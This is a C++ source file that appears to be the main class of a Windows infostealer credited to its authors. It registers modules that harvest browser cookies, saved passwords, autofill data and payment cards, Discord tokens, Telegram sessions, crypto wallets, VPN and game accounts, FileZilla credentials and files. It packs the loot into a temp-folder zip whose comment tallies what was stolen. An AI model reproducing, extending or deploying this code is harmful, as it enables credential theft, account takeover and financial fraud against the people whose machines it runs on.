//
// Created by .1qxz on 06.06.2024.
//

#include "Stealer.h"
#include "miniz.h"
#include "impl/Screenshot.h"
#include "impl/Info.h"
#include "impl/messengers/Messengers.h"
#include "impl/files/Files.h"
#include "impl/Processes.h"
#include "impl/crypto/Crypto.h"
#include "impl/vpns/VPNs.h"
#include "impl/games/Games.h"
#include "impl/InstalledApps.h"
#include "impl/FileZilla.h"
#include "impl/browsers/chromium/ChromiumBrowsers.h"
#include "impl/browsers/firefox/FirefoxBrowsers.h"
#include "../Config.h"
#include "../Counter.h"

void Stealer::registerModules() {
    this->modules.push_back(new Screenshot());
    this->modules.push_back(new Messengers());
    this->modules.push_back(new Crypto());
    this->modules.push_back(new VPNs());
    this->modules.push_back(new Games());
    this->modules.push_back(new Files());
    this->modules.push_back(new Info());
    this->modules.push_back(new Processes());
    this->modules.push_back(new InstalledApps());
    this->modules.push_back(new FileZilla());
    this->modules.push_back(new ChromiumBrowsers());
    this->modules.push_back(new FirefoxBrowsers());
}


Stealer::Stealer() {
    this->registerModules();

    this->root_dir = Utils::getTemp() / Utils::generateString(10);
    fs::create_directory(this->root_dir);

#if DEV
    std::string cmd = "explorer.exe " + this->root_dir.string();
    std::system(cmd.c_str());
#endif
}

void Stealer::run() {
    StealerModuleGroup::execute(this->root_dir);
}

void Stealer::complete() {
    fs::path log = this->zip_log();
    fs::remove_all(this->root_dir);

    std::string cmd = "explorer.exe /select," + log.string();
    std::system(cmd.c_str());
}

void add_file_to_zip(mz_zip_archive& zip_archive, const fs::path& file_path, const fs::path& base_path) {
    std::string file_in_zip = fs::relative(file_path, base_path).string();
    mz_zip_writer_add_file(&zip_archive, file_in_zip.c_str(), file_path.string().c_str(), nullptr, 0, MZ_DEFAULT_COMPRESSION);
}

void add_folder_to_zip(mz_zip_archive& zip_archive, const fs::path& folder_path, const fs::path& base_path) {
    for (const auto& entry : fs::recursive_directory_iterator(folder_path)) {
        if (fs::is_regular_file(entry.path())) {
            add_file_to_zip(zip_archive, entry.path(), base_path);
        }
    }
}

void add_comment_to_zip(const std::string& archive_path, const std::string& comment) {
    std::fstream file(archive_path, std::ios::in | std::ios::out | std::ios::binary);
    if (!file) {
        return;
    }

    file.seekg(-22, std::ios::end);
    std::streampos end_of_central_dir = file.tellg();
    char buffer[22];
    file.read(buffer, 22);

    if (buffer[0] != 'P' || buffer[1] != 'K' || buffer[2] != 5 || buffer[3] != 6) {
        return;
    }

    auto comment_size = static_cast<int>(comment.size());
    buffer[20] = comment_size & 0xFF;
    buffer[21] = (comment_size >> 8) & 0xFF;

    file.seekp(end_of_central_dir);
    file.write(buffer, 22);
    file.write(comment.c_str(), comment.size());

    file.close();
}

fs::path Stealer::zip_log() {
    fs::path out_zip = Utils::getTemp() / Utils::generateString(20);
    std::ofstream f(out_zip);
    f.close();

    mz_zip_archive zip_archive;
    memset(&zip_archive, 0, sizeof(zip_archive));
    if (!mz_zip_writer_init_file(&zip_archive, out_zip.string().c_str(), 0)) {
        return "";
    }

    add_folder_to_zip(zip_archive, this->root_dir, this->root_dir);

    std::stringstream comment;

    comment << NAME << "™️ v" << VERSION << " - coded by .1qxz, xakerxlop with Love <3" << "\n";
    comment << "\n";
    comment << "== Browsers ==" << "\n";
    comment << "Cookies: " << std::to_string(Counter::getCookies()) << "\n";
    comment << "Passwords: " << std::to_string(Counter::getPasswords()) << "\n";
    comment << "Auto fills: " << std::to_string(Counter::getAutoFills()) << "\n";
    comment << "Cards: " << std::to_string(Counter::getCards()) << "\n";
    comment << "Bookmarks: " << std::to_string(Counter::getBookmarks()) << "\n";
    comment << "Downloads: " << std::to_string(Counter::getDownloads()) << "\n";
    comment << "History: " << std::to_string(Counter::getHistory()) << "\n";
    comment << "\n";
    comment << "== Games ==" << "\n";
    comment << "Battle.net: " << (Counter::isBattlenet() ? "Yes" : "No") << "\n";
    comment << "Ubisoft: " << (Counter::isUbisoftConnect() ? "Yes" : "No") << "\n";
    comment << "Minecraft: " << (Counter::isMinecraft() ? "Yes" : "No") << "\n";
    comment << "Steam: " << (Counter::isSteam() ? "Yes" : "No") << "\n";
    comment << "\n";
    comment << "== Messengers ==" << "\n";
    comment << "Telegram: " << (Counter::isTelegram() ? "Yes" : "No") << "\n";
    comment << "Discord tokens: " << std::to_string(Counter::getDiscordTokens()) << "\n";
    comment << "\n";
    comment << "== Other ==" << "\n";
    comment << "Files grabbed: " << std::to_string(Counter::getFiles()) << "\n";

    if (!mz_zip_writer_finalize_archive(&zip_archive)) {
        mz_zip_writer_end(&zip_archive);
        return "";
    }

    mz_zip_writer_end(&zip_archive);
    add_comment_to_zip(out_zip.string(), comment.str());

    return out_zip;
}
